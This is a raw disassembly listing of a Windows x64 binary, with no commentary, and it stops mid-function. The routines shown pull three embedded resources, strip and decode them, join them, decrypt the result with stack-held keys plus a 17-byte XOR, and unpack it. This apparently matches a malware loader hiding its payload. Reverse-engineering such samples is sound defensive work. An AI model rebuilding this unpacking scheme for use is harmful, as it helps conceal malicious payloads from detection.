   14000174a:	44 2b c7             	sub    %edi,%r8d
   14000174d:	41 3b d0             	cmp    %r8d,%edx
   140001750:	44 0f 4e c2          	cmovle %edx,%r8d
   140001754:	45 2b ca             	sub    %r10d,%r9d
   140001757:	33 d2                	xor    %edx,%edx
   140001759:	45 85 c0             	test   %r8d,%r8d
   14000175c:	7e 23                	jle    0x140001781
   14000175e:	66 90                	xchg   %ax,%ax
   140001760:	8d 0c 3a             	lea    (%rdx,%rdi,1),%ecx
   140001763:	41 3b cf             	cmp    %r15d,%ecx
   140001766:	7d 19                	jge    0x140001781
   140001768:	42 8d 04 0a          	lea    (%rdx,%r9,1),%eax
   14000176c:	48 63 c9             	movslq %ecx,%rcx
   14000176f:	48 98                	cltq
   140001771:	ff c2                	inc    %edx
   140001773:	42 0f b6 04 20       	movzbl (%rax,%r12,1),%eax
   140001778:	42 88 04 21          	mov    %al,(%rcx,%r12,1)
   14000177c:	41 3b d0             	cmp    %r8d,%edx
   14000177f:	7c df                	jl     0x140001760
   140001781:	41 03 f8             	add    %r8d,%edi
   140001784:	3b de                	cmp    %esi,%ebx
   140001786:	0f 8c 85 fe ff ff    	jl     0x140001611
   14000178c:	4c 8b 6c 24 60       	mov    0x60(%rsp),%r13
   140001791:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   140001796:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000179b:	8b c7                	mov    %edi,%eax
   14000179d:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400017a2:	48 83 c4 28          	add    $0x28,%rsp
   1400017a6:	41 5f                	pop    %r15
   1400017a8:	41 5c                	pop    %r12
   1400017aa:	5e                   	pop    %rsi
   1400017ab:	5d                   	pop    %rbp
   1400017ac:	c3                   	ret
   1400017ad:	33 c0                	xor    %eax,%eax
   1400017af:	48 83 c4 28          	add    $0x28,%rsp
   1400017b3:	41 5f                	pop    %r15
   1400017b5:	41 5c                	pop    %r12
   1400017b7:	5e                   	pop    %rsi
   1400017b8:	5d                   	pop    %rbp
   1400017b9:	c3                   	ret
   1400017ba:	cc                   	int3
   1400017bb:	cc                   	int3
   1400017bc:	cc                   	int3
   1400017bd:	cc                   	int3
   1400017be:	cc                   	int3
   1400017bf:	cc                   	int3
   1400017c0:	40 55                	rex push %rbp
   1400017c2:	53                   	push   %rbx
   1400017c3:	41 56                	push   %r14
   1400017c5:	48 8b ec             	mov    %rsp,%rbp
   1400017c8:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1400017cf:	48 8b 05 2a c8 01 00 	mov    0x1c82a(%rip),%rax        # 0x14001e000
   1400017d6:	48 33 c4             	xor    %rsp,%rax
   1400017d9:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400017dd:	ba a5 14 00 00       	mov    $0x14a5,%edx
   1400017e2:	c7 45 d0 cf 2a cb d4 	movl   $0xd4cb2acf,-0x30(%rbp)
   1400017e9:	33 c9                	xor    %ecx,%ecx
   1400017eb:	c7 45 d4 d7 cb 13 5f 	movl   $0x5f13cbd7,-0x2c(%rbp)
   1400017f2:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   1400017f8:	c7 45 d8 c5 dc b5 38 	movl   $0x38b5dcc5,-0x28(%rbp)
   1400017ff:	c7 45 dc 0a d2 da 0d 	movl   $0xddad20a,-0x24(%rbp)
   140001806:	33 db                	xor    %ebx,%ebx
   140001808:	c7 45 e0 74 6b 96 62 	movl   $0x62966b74,-0x20(%rbp)
   14000180f:	c7 45 e4 03 3a 71 5c 	movl   $0x5c713a03,-0x1c(%rbp)
   140001816:	c7 45 e8 d8 1a a5 ba 	movl   $0xbaa51ad8,-0x18(%rbp)
   14000181d:	c7 45 ec a9 61 84 41 	movl   $0x418461a9,-0x14(%rbp)
   140001824:	c7 45 a8 e6 5c 81 d9 	movl   $0xd9815ce6,-0x58(%rbp)
   14000182b:	c7 45 ac f9 ac 58 2f 	movl   $0x2f58acf9,-0x54(%rbp)
   140001832:	c7 45 b0 ab b9 9e 72 	movl   $0x729eb9ab,-0x50(%rbp)
   140001839:	c7 45 b4 92 ed 6b 67 	movl   $0x676bed92,-0x4c(%rbp)
   140001840:	c7 45 b8 51 c1 dd fb 	movl   $0xfbddc151,-0x48(%rbp)
   140001847:	c7 45 bc 4c ab e2 8b 	movl   $0x8be2ab4c,-0x44(%rbp)
   14000184e:	c7 45 c0 80 24 24 f0 	movl   $0xf0242480,-0x40(%rbp)
   140001855:	c7 45 c4 3c 0e db a3 	movl   $0xa3db0e3c,-0x3c(%rbp)
   14000185c:	c6 45 c8 0e          	movb   $0xe,-0x38(%rbp)
   140001860:	ff 15 42 d3 01 00    	call   *0x1d342(%rip)        # 0x14001eba8
   140001866:	48 85 c0             	test   %rax,%rax
   140001869:	74 0d                	je     0x140001878
   14000186b:	48 8b d0             	mov    %rax,%rdx
   14000186e:	33 c9                	xor    %ecx,%ecx
   140001870:	ff 15 4a d3 01 00    	call   *0x1d34a(%rip)        # 0x14001ebc0
   140001876:	8b d8                	mov    %eax,%ebx
   140001878:	ba 1d 0c 00 00       	mov    $0xc1d,%edx
   14000187d:	33 c9                	xor    %ecx,%ecx
   14000187f:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140001885:	ff 15 1d d3 01 00    	call   *0x1d31d(%rip)        # 0x14001eba8
   14000188b:	48 85 c0             	test   %rax,%rax
   14000188e:	74 0d                	je     0x14000189d
   140001890:	48 8b d0             	mov    %rax,%rdx
   140001893:	33 c9                	xor    %ecx,%ecx
   140001895:	ff 15 25 d3 01 00    	call   *0x1d325(%rip)        # 0x14001ebc0
   14000189b:	03 d8                	add    %eax,%ebx
   14000189d:	ba 0d 1c 00 00       	mov    $0x1c0d,%edx
   1400018a2:	33 c9                	xor    %ecx,%ecx
   1400018a4:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   1400018aa:	ff 15 f8 d2 01 00    	call   *0x1d2f8(%rip)        # 0x14001eba8
   1400018b0:	48 85 c0             	test   %rax,%rax
   1400018b3:	74 0d                	je     0x1400018c2
   1400018b5:	48 8b d0             	mov    %rax,%rdx
   1400018b8:	33 c9                	xor    %ecx,%ecx
   1400018ba:	ff 15 00 d3 01 00    	call   *0x1d300(%rip)        # 0x14001ebc0
   1400018c0:	03 d8                	add    %eax,%ebx
   1400018c2:	8d 04 1b             	lea    (%rbx,%rbx,1),%eax
   1400018c5:	33 c9                	xor    %ecx,%ecx
   1400018c7:	48 63 d0             	movslq %eax,%rdx
   1400018ca:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1400018d0:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   1400018d6:	ff 15 e4 d1 01 00    	call   *0x1d1e4(%rip)        # 0x14001eac0
   1400018dc:	4c 8b f0             	mov    %rax,%r14
   1400018df:	48 85 c0             	test   %rax,%rax
   1400018e2:	0f 84 d4 04 00 00    	je     0x140001dbc
   1400018e8:	ba a5 14 00 00       	mov    $0x14a5,%edx
   1400018ed:	33 c9                	xor    %ecx,%ecx
   1400018ef:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   1400018f5:	ff 15 ad d2 01 00    	call   *0x1d2ad(%rip)        # 0x14001eba8
   1400018fb:	48 8b d8             	mov    %rax,%rbx
   1400018fe:	48 85 c0             	test   %rax,%rax
   140001901:	0f 84 b5 04 00 00    	je     0x140001dbc
   140001907:	48 8b d0             	mov    %rax,%rdx
   14000190a:	33 c9                	xor    %ecx,%ecx
   14000190c:	ff 15 9e d2 01 00    	call   *0x1d29e(%rip)        # 0x14001ebb0
   140001912:	48 85 c0             	test   %rax,%rax
   140001915:	0f 84 a1 04 00 00    	je     0x140001dbc
   14000191b:	48 8b c8             	mov    %rax,%rcx
   14000191e:	48 89 bc 24 a8 00 00 	mov    %rdi,0xa8(%rsp)
   140001925:	00 
   140001926:	ff 15 8c d2 01 00    	call   *0x1d28c(%rip)        # 0x14001ebb8
   14000192c:	48 8b d3             	mov    %rbx,%rdx
   14000192f:	33 c9                	xor    %ecx,%ecx
   140001931:	48 8b f8             	mov    %rax,%rdi
   140001934:	ff 15 86 d2 01 00    	call   *0x1d286(%rip)        # 0x14001ebc0
   14000193a:	48 85 ff             	test   %rdi,%rdi
   14000193d:	0f 84 71 04 00 00    	je     0x140001db4
   140001943:	85 c0                	test   %eax,%eax
   140001945:	0f 8e 69 04 00 00    	jle    0x140001db4
   14000194b:	99                   	cltd
   14000194c:	33 c9                	xor    %ecx,%ecx
   14000194e:	83 e2 03             	and    $0x3,%edx
   140001951:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140001957:	03 c2                	add    %edx,%eax
   140001959:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   14000195f:	c1 f8 02             	sar    $0x2,%eax
   140001962:	48 63 d8             	movslq %eax,%rbx
   140001965:	48 8d 53 01          	lea    0x1(%rbx),%rdx
   140001969:	ff 15 51 d1 01 00    	call   *0x1d151(%rip)        # 0x14001eac0
   14000196f:	4c 8b d0             	mov    %rax,%r10
   140001972:	48 85 c0             	test   %rax,%rax
   140001975:	0f 84 39 04 00 00    	je     0x140001db4
   14000197b:	45 33 c0             	xor    %r8d,%r8d
   14000197e:	48 89 b4 24 a0 00 00 	mov    %rsi,0xa0(%rsp)
   140001985:	00 
   140001986:	85 db                	test   %ebx,%ebx
   140001988:	7e 20                	jle    0x1400019aa
   14000198a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001990:	42 8d 04 85 00 00 00 	lea    0x0(,%r8,4),%eax
   140001997:	00 
   140001998:	48 98                	cltq
   14000199a:	0f b6 04 38          	movzbl (%rax,%rdi,1),%eax
   14000199e:	43 88 04 10          	mov    %al,(%r8,%r10,1)
   1400019a2:	41 ff c0             	inc    %r8d
   1400019a5:	44 3b c3             	cmp    %ebx,%r8d
   1400019a8:	7c e6                	jl     0x140001990
   1400019aa:	4c 8b 0d 0f d1 01 00 	mov    0x1d10f(%rip),%r9        # 0x14001eac0
   1400019b1:	4c 8d 45 a0          	lea    -0x60(%rbp),%r8
   1400019b5:	8b d3                	mov    %ebx,%edx
   1400019b7:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
   1400019be:	49 8b ca             	mov    %r10,%rcx
   1400019c1:	e8 4a 06 00 00       	call   0x140002010
   1400019c6:	48 8b f0             	mov    %rax,%rsi
   1400019c9:	48 85 c0             	test   %rax,%rax
   1400019cc:	0f 84 da 03 00 00    	je     0x140001dac
   1400019d2:	48 63 7d a0          	movslq -0x60(%rbp),%rdi
   1400019d6:	85 ff                	test   %edi,%edi
   1400019d8:	0f 8e ce 03 00 00    	jle    0x140001dac
   1400019de:	33 db                	xor    %ebx,%ebx
   1400019e0:	83 ff 10             	cmp    $0x10,%edi
   1400019e3:	72 31                	jb     0x140001a16
   1400019e5:	8d 47 ff             	lea    -0x1(%rdi),%eax
   1400019e8:	48 63 c8             	movslq %eax,%rcx
   1400019eb:	48 8d 04 31          	lea    (%rcx,%rsi,1),%rax
   1400019ef:	4c 3b f0             	cmp    %rax,%r14
   1400019f2:	77 09                	ja     0x1400019fd
   1400019f4:	4a 8d 04 31          	lea    (%rcx,%r14,1),%rax
   1400019f8:	48 3b c6             	cmp    %rsi,%rax
   1400019fb:	73 19                	jae    0x140001a16
   1400019fd:	4c 8b c7             	mov    %rdi,%r8
   140001a00:	48 8b d6             	mov    %rsi,%rdx
   140001a03:	49 8b ce             	mov    %r14,%rcx
   140001a06:	e8 45 d0 00 00       	call   0x14000ea50
   140001a0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001a10:	ff c3                	inc    %ebx
   140001a12:	3b df                	cmp    %edi,%ebx
   140001a14:	7c fa                	jl     0x140001a10
   140001a16:	3b df                	cmp    %edi,%ebx
   140001a18:	7d 17                	jge    0x140001a31
   140001a1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001a20:	48 63 cb             	movslq %ebx,%rcx
   140001a23:	ff c3                	inc    %ebx
   140001a25:	0f b6 04 31          	movzbl (%rcx,%rsi,1),%eax
   140001a29:	42 88 04 31          	mov    %al,(%rcx,%r14,1)
   140001a2d:	3b df                	cmp    %edi,%ebx
   140001a2f:	7c ef                	jl     0x140001a20
   140001a31:	ba 1d 0c 00 00       	mov    $0xc1d,%edx
   140001a36:	33 c9                	xor    %ecx,%ecx
   140001a38:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140001a3e:	ff 15 64 d1 01 00    	call   *0x1d164(%rip)        # 0x14001eba8
   140001a44:	48 8b d8             	mov    %rax,%rbx
   140001a47:	48 85 c0             	test   %rax,%rax
   140001a4a:	0f 84 5c 03 00 00    	je     0x140001dac
   140001a50:	48 8b d0             	mov    %rax,%rdx
   140001a53:	33 c9                	xor    %ecx,%ecx
   140001a55:	ff 15 55 d1 01 00    	call   *0x1d155(%rip)        # 0x14001ebb0
   140001a5b:	48 85 c0             	test   %rax,%rax
   140001a5e:	0f 84 48 03 00 00    	je     0x140001dac
   140001a64:	48 8b c8             	mov    %rax,%rcx
   140001a67:	ff 15 4b d1 01 00    	call   *0x1d14b(%rip)        # 0x14001ebb8
   140001a6d:	48 8b d3             	mov    %rbx,%rdx
   140001a70:	33 c9                	xor    %ecx,%ecx
   140001a72:	48 8b f0             	mov    %rax,%rsi
   140001a75:	ff 15 45 d1 01 00    	call   *0x1d145(%rip)        # 0x14001ebc0
   140001a7b:	48 85 f6             	test   %rsi,%rsi
   140001a7e:	0f 84 28 03 00 00    	je     0x140001dac
   140001a84:	85 c0                	test   %eax,%eax
   140001a86:	0f 8e 20 03 00 00    	jle    0x140001dac
   140001a8c:	99                   	cltd
   140001a8d:	33 c9                	xor    %ecx,%ecx
   140001a8f:	83 e2 03             	and    $0x3,%edx
   140001a92:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140001a98:	03 c2                	add    %edx,%eax
   140001a9a:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140001aa0:	c1 f8 02             	sar    $0x2,%eax
   140001aa3:	48 63 d8             	movslq %eax,%rbx
   140001aa6:	48 8d 53 01          	lea    0x1(%rbx),%rdx
   140001aaa:	ff 15 10 d0 01 00    	call   *0x1d010(%rip)        # 0x14001eac0
   140001ab0:	4c 8b d0             	mov    %rax,%r10
   140001ab3:	48 85 c0             	test   %rax,%rax
   140001ab6:	0f 84 f0 02 00 00    	je     0x140001dac
   140001abc:	45 33 c0             	xor    %r8d,%r8d
   140001abf:	85 db                	test   %ebx,%ebx
   140001ac1:	7e 27                	jle    0x140001aea
   140001ac3:	0f 1f 40 00          	nopl   0x0(%rax)
   140001ac7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001ace:	00 00 
   140001ad0:	42 8d 04 85 00 00 00 	lea    0x0(,%r8,4),%eax
   140001ad7:	00 
   140001ad8:	48 98                	cltq
   140001ada:	0f b6 04 30          	movzbl (%rax,%rsi,1),%eax
   140001ade:	43 88 04 10          	mov    %al,(%r8,%r10,1)
   140001ae2:	41 ff c0             	inc    %r8d
   140001ae5:	44 3b c3             	cmp    %ebx,%r8d
   140001ae8:	7c e6                	jl     0x140001ad0
   140001aea:	4c 8b 0d cf cf 01 00 	mov    0x1cfcf(%rip),%r9        # 0x14001eac0
   140001af1:	4c 8d 45 a0          	lea    -0x60(%rbp),%r8
   140001af5:	8b d3                	mov    %ebx,%edx
   140001af7:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
   140001afe:	49 8b ca             	mov    %r10,%rcx
   140001b01:	e8 0a 05 00 00       	call   0x140002010
   140001b06:	48 8b f0             	mov    %rax,%rsi
   140001b09:	48 85 c0             	test   %rax,%rax
   140001b0c:	0f 84 9a 02 00 00    	je     0x140001dac
   140001b12:	4c 89 bc 24 b8 00 00 	mov    %r15,0xb8(%rsp)
   140001b19:	00 
   140001b1a:	4c 63 7d a0          	movslq -0x60(%rbp),%r15
   140001b1e:	45 85 ff             	test   %r15d,%r15d
   140001b21:	0f 8e 7d 02 00 00    	jle    0x140001da4
   140001b27:	33 db                	xor    %ebx,%ebx
   140001b29:	41 83 ff 10          	cmp    $0x10,%r15d
   140001b2d:	72 38                	jb     0x140001b67
   140001b2f:	41 8d 4f ff          	lea    -0x1(%r15),%ecx
   140001b33:	48 63 c1             	movslq %ecx,%rax
   140001b36:	4d 8d 0c 3e          	lea    (%r14,%rdi,1),%r9
   140001b3a:	48 03 c6             	add    %rsi,%rax
   140001b3d:	4c 3b c8             	cmp    %rax,%r9
   140001b40:	77 0e                	ja     0x140001b50
   140001b42:	8d 04 39             	lea    (%rcx,%rdi,1),%eax
   140001b45:	48 63 c8             	movslq %eax,%rcx
   140001b48:	49 03 ce             	add    %r14,%rcx
   140001b4b:	48 3b ce             	cmp    %rsi,%rcx
   140001b4e:	73 17                	jae    0x140001b67
   140001b50:	4d 8b c7             	mov    %r15,%r8
   140001b53:	48 8b d6             	mov    %rsi,%rdx
   140001b56:	49 8b c9             	mov    %r9,%rcx
   140001b59:	e8 f2 ce 00 00       	call   0x14000ea50
   140001b5e:	66 90                	xchg   %ax,%ax
   140001b60:	ff c3                	inc    %ebx
   140001b62:	41 3b df             	cmp    %r15d,%ebx
   140001b65:	7c f9                	jl     0x140001b60
   140001b67:	41 3b df             	cmp    %r15d,%ebx
   140001b6a:	7d 1d                	jge    0x140001b89
   140001b6c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001b70:	8d 04 3b             	lea    (%rbx,%rdi,1),%eax
   140001b73:	4c 63 cb             	movslq %ebx,%r9
   140001b76:	48 63 c8             	movslq %eax,%rcx
   140001b79:	ff c3                	inc    %ebx
   140001b7b:	41 0f b6 04 31       	movzbl (%r9,%rsi,1),%eax
   140001b80:	42 88 04 31          	mov    %al,(%rcx,%r14,1)
   140001b84:	41 3b df             	cmp    %r15d,%ebx
   140001b87:	7c e7                	jl     0x140001b70
   140001b89:	ba 0d 1c 00 00       	mov    $0x1c0d,%edx
   140001b8e:	33 c9                	xor    %ecx,%ecx
   140001b90:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140001b96:	ff 15 0c d0 01 00    	call   *0x1d00c(%rip)        # 0x14001eba8
   140001b9c:	48 8b d8             	mov    %rax,%rbx
   140001b9f:	48 85 c0             	test   %rax,%rax
   140001ba2:	0f 84 fc 01 00 00    	je     0x140001da4
   140001ba8:	48 8b d0             	mov    %rax,%rdx
   140001bab:	33 c9                	xor    %ecx,%ecx
   140001bad:	ff 15 fd cf 01 00    	call   *0x1cffd(%rip)        # 0x14001ebb0
   140001bb3:	48 85 c0             	test   %rax,%rax
   140001bb6:	0f 84 e8 01 00 00    	je     0x140001da4
   140001bbc:	48 8b c8             	mov    %rax,%rcx
   140001bbf:	ff 15 f3 cf 01 00    	call   *0x1cff3(%rip)        # 0x14001ebb8
   140001bc5:	48 8b d3             	mov    %rbx,%rdx
   140001bc8:	33 c9                	xor    %ecx,%ecx
   140001bca:	48 8b f0             	mov    %rax,%rsi
   140001bcd:	ff 15 ed cf 01 00    	call   *0x1cfed(%rip)        # 0x14001ebc0
   140001bd3:	48 85 f6             	test   %rsi,%rsi
   140001bd6:	0f 84 c8 01 00 00    	je     0x140001da4
   140001bdc:	85 c0                	test   %eax,%eax
   140001bde:	0f 8e c0 01 00 00    	jle    0x140001da4
   140001be4:	99                   	cltd
   140001be5:	33 c9                	xor    %ecx,%ecx
   140001be7:	83 e2 03             	and    $0x3,%edx
   140001bea:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140001bf0:	03 c2                	add    %edx,%eax
   140001bf2:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140001bf8:	c1 f8 02             	sar    $0x2,%eax
   140001bfb:	48 63 d8             	movslq %eax,%rbx
   140001bfe:	48 8d 53 01          	lea    0x1(%rbx),%rdx
   140001c02:	ff 15 b8 ce 01 00    	call   *0x1ceb8(%rip)        # 0x14001eac0
   140001c08:	4c 8b d0             	mov    %rax,%r10
   140001c0b:	48 85 c0             	test   %rax,%rax
   140001c0e:	0f 84 90 01 00 00    	je     0x140001da4
   140001c14:	45 33 c0             	xor    %r8d,%r8d
   140001c17:	4c 89 a4 24 b0 00 00 	mov    %r12,0xb0(%rsp)
   140001c1e:	00 
   140001c1f:	85 db                	test   %ebx,%ebx
   140001c21:	7e 27                	jle    0x140001c4a
   140001c23:	0f 1f 40 00          	nopl   0x0(%rax)
   140001c27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001c2e:	00 00 
   140001c30:	42 8d 04 85 00 00 00 	lea    0x0(,%r8,4),%eax
   140001c37:	00 
   140001c38:	48 98                	cltq
   140001c3a:	0f b6 04 30          	movzbl (%rax,%rsi,1),%eax
   140001c3e:	43 88 04 10          	mov    %al,(%r8,%r10,1)
   140001c42:	41 ff c0             	inc    %r8d
   140001c45:	44 3b c3             	cmp    %ebx,%r8d
   140001c48:	7c e6                	jl     0x140001c30
   140001c4a:	4c 8b 0d 6f ce 01 00 	mov    0x1ce6f(%rip),%r9        # 0x14001eac0
   140001c51:	4c 8d 45 a0          	lea    -0x60(%rbp),%r8
   140001c55:	8b d3                	mov    %ebx,%edx
   140001c57:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
   140001c5e:	49 8b ca             	mov    %r10,%rcx
   140001c61:	e8 aa 03 00 00       	call   0x140002010
   140001c66:	4c 8b e0             	mov    %rax,%r12
   140001c69:	48 85 c0             	test   %rax,%rax
   140001c6c:	0f 84 2a 01 00 00    	je     0x140001d9c
   140001c72:	48 63 75 a0          	movslq -0x60(%rbp),%rsi
   140001c76:	85 f6                	test   %esi,%esi
   140001c78:	0f 8e 1e 01 00 00    	jle    0x140001d9c
   140001c7e:	41 03 ff             	add    %r15d,%edi
   140001c81:	85 f6                	test   %esi,%esi
   140001c83:	7e 63                	jle    0x140001ce8
   140001c85:	33 db                	xor    %ebx,%ebx
   140001c87:	83 fe 10             	cmp    $0x10,%esi
   140001c8a:	72 3a                	jb     0x140001cc6
   140001c8c:	8d 4e ff             	lea    -0x1(%rsi),%ecx
   140001c8f:	4c 63 cf             	movslq %edi,%r9
   140001c92:	48 63 c1             	movslq %ecx,%rax
   140001c95:	4d 03 ce             	add    %r14,%r9
   140001c98:	49 03 c4             	add    %r12,%rax
   140001c9b:	4c 3b c8             	cmp    %rax,%r9
   140001c9e:	77 0e                	ja     0x140001cae
   140001ca0:	8d 04 39             	lea    (%rcx,%rdi,1),%eax
   140001ca3:	48 63 c8             	movslq %eax,%rcx
   140001ca6:	49 03 ce             	add    %r14,%rcx
   140001ca9:	49 3b cc             	cmp    %r12,%rcx
   140001cac:	73 18                	jae    0x140001cc6
   140001cae:	4c 8b c6             	mov    %rsi,%r8
   140001cb1:	49 8b d4             	mov    %r12,%rdx
   140001cb4:	49 8b c9             	mov    %r9,%rcx
   140001cb7:	e8 94 cd 00 00       	call   0x14000ea50
   140001cbc:	0f 1f 40 00          	nopl   0x0(%rax)
   140001cc0:	ff c3                	inc    %ebx
   140001cc2:	3b de                	cmp    %esi,%ebx
   140001cc4:	7c fa                	jl     0x140001cc0
   140001cc6:	3b de                	cmp    %esi,%ebx
   140001cc8:	7d 1e                	jge    0x140001ce8
   140001cca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001cd0:	8d 04 3b             	lea    (%rbx,%rdi,1),%eax
   140001cd3:	48 63 d3             	movslq %ebx,%rdx
   140001cd6:	48 63 c8             	movslq %eax,%rcx
   140001cd9:	ff c3                	inc    %ebx
   140001cdb:	42 0f b6 04 22       	movzbl (%rdx,%r12,1),%eax
   140001ce0:	42 88 04 31          	mov    %al,(%rcx,%r14,1)
   140001ce4:	3b de                	cmp    %esi,%ebx
   140001ce6:	7c e8                	jl     0x140001cd0
   140001ce8:	03 fe                	add    %esi,%edi
   140001cea:	85 ff                	test   %edi,%edi
   140001cec:	0f 8e aa 00 00 00    	jle    0x140001d9c
   140001cf2:	44 8b cf             	mov    %edi,%r9d
   140001cf5:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
   140001cf9:	4d 8b c6             	mov    %r14,%r8
   140001cfc:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140001d00:	e8 4b f4 ff ff       	call   0x140001150
   140001d05:	45 33 c9             	xor    %r9d,%r9d
   140001d08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001d0f:	00 
   140001d10:	b8 f1 f0 f0 f0       	mov    $0xf0f0f0f1,%eax
   140001d15:	41 8b c9             	mov    %r9d,%ecx
   140001d18:	41 f7 e1             	mul    %r9d
   140001d1b:	c1 ea 04             	shr    $0x4,%edx
   140001d1e:	6b c2 11             	imul   $0x11,%edx,%eax
   140001d21:	2b c8                	sub    %eax,%ecx
   140001d23:	48 63 c1             	movslq %ecx,%rax
   140001d26:	0f b6 4c 05 b8       	movzbl -0x48(%rbp,%rax,1),%ecx
   140001d2b:	43 30 0c 31          	xor    %cl,(%r9,%r14,1)
   140001d2f:	41 ff c1             	inc    %r9d
   140001d32:	44 3b cf             	cmp    %edi,%r9d
   140001d35:	7c d9                	jl     0x140001d10
   140001d37:	41 0f b6 46 02       	movzbl 0x2(%r14),%eax
   140001d3c:	33 c9                	xor    %ecx,%ecx
   140001d3e:	41 0f b6 76 03       	movzbl 0x3(%r14),%esi
   140001d43:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140001d49:	c1 e6 08             	shl    $0x8,%esi
   140001d4c:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140001d52:	0b f0                	or     %eax,%esi
   140001d54:	41 0f b6 46 01       	movzbl 0x1(%r14),%eax
   140001d59:	c1 e6 08             	shl    $0x8,%esi
   140001d5c:	0b f0                	or     %eax,%esi
   140001d5e:	41 0f b6 06          	movzbl (%r14),%eax
   140001d62:	c1 e6 08             	shl    $0x8,%esi
   140001d65:	0b f0                	or     %eax,%esi
   140001d67:	81 c6 00 01 00 00    	add    $0x100,%esi
   140001d6d:	48 63 d6             	movslq %esi,%rdx
   140001d70:	ff 15 4a cd 01 00    	call   *0x1cd4a(%rip)        # 0x14001eac0
   140001d76:	48 8b d8             	mov    %rax,%rbx
   140001d79:	48 85 c0             	test   %rax,%rax
   140001d7c:	74 1e                	je     0x140001d9c
   140001d7e:	44 8b ce             	mov    %esi,%r9d
   140001d81:	4c 8b c0             	mov    %rax,%r8
   140001d84:	8b d7                	mov    %edi,%edx
   140001d86:	49 8b ce             	mov    %r14,%rcx
   140001d89:	e8 12 f8 ff ff       	call   0x1400015a0
   140001d8e:	85 c0                	test   %eax,%eax
   140001d90:	7e 0a                	jle    0x140001d9c
   140001d92:	8b d0                	mov    %eax,%edx
   140001d94:	48 8b cb             	mov    %rbx,%rcx
   140001d97:	e8 24 03 00 00       	call   0x1400020c0
   140001d9c:	4c 8b a4 24 b0 00 00 	mov    0xb0(%rsp),%r12
   140001da3:	00 
   140001da4:	4c 8b bc 24 b8 00 00 	mov    0xb8(%rsp),%r15
   140001dab:	00 
   140001dac:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140001db3:	00 
   140001db4:	48 8b bc 24 a8 00 00 	mov    0xa8(%rsp),%rdi
   140001dbb:	00 
   140001dbc:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140001dc0:	48 33 cc             	xor    %rsp,%rcx
   140001dc3:	e8 48 13 00 00       	call   0x140003110
   140001dc8:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140001dcf:	41 5e                	pop    %r14
   140001dd1:	5b                   	pop    %rbx
   140001dd2:	5d                   	pop    %rbp
   140001dd3:	c3                   	ret
   140001dd4:	cc                   	int3
   140001dd5:	cc                   	int3
   140001dd6:	cc                   	int3
   140001dd7:	cc                   	int3
   140001dd8:	cc                   	int3
   140001dd9:	cc                   	int3
   140001dda:	cc                   	int3
   140001ddb:	cc                   	int3
   140001ddc:	cc                   	int3
   140001ddd:	cc                   	int3
   140001dde:	cc                   	int3
   140001ddf:	cc                   	int3
   140001de0:	40 55                	rex push %rbp
   140001de2:	41 56                	push   %r14
   140001de4:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
   140001deb:	48 8b 05 0e c2 01 00 	mov    0x1c20e(%rip),%rax        # 0x14001e000
   140001df2:	48 33 c4             	xor    %rsp,%rax
   140001df5:	48 89 84 24 00 01 00 	mov    %rax,0x100(%rsp)
   140001dfc:	00 
   140001dfd:	33 c0                	xor    %eax,%eax
   140001dff:	49 8b e8             	mov    %r8,%rbp
   140001e02:	4c 8b f1             	mov    %rcx,%r14
   140001e05:	83 fa 04             	cmp    $0x4,%edx
   140001e08:	0f 8c d6 01 00 00    	jl     0x140001fe4
   140001e0e:	3d 80 00 00 00       	cmp    $0x80,%eax
   140001e13:	0f 83 e6 01 00 00    	jae    0x140001fff
   140001e19:	c6 84 04 80 00 00 00 	movb   $0x0,0x80(%rsp,%rax,1)
   140001e20:	00 
   140001e21:	ff c0                	inc    %eax
   140001e23:	3d 80 00 00 00       	cmp    $0x80,%eax
   140001e28:	7c e9                	jl     0x140001e13
   140001e2a:	0f b6 41 02          	movzbl 0x2(%rcx),%eax
   140001e2e:	0f 28 05 5b ee 00 00 	movaps 0xee5b(%rip),%xmm0        # 0x140010c90
   140001e35:	0f 28 15 44 ee 00 00 	movaps 0xee44(%rip),%xmm2        # 0x140010c80
   140001e3c:	0f 28 0d 5d ee 00 00 	movaps 0xee5d(%rip),%xmm1        # 0x140010ca0
   140001e43:	48 89 b4 24 48 01 00 	mov    %rsi,0x148(%rsp)
   140001e4a:	00 
   140001e4b:	48 89 bc 24 20 01 00 	mov    %rdi,0x120(%rsp)
   140001e52:	00 
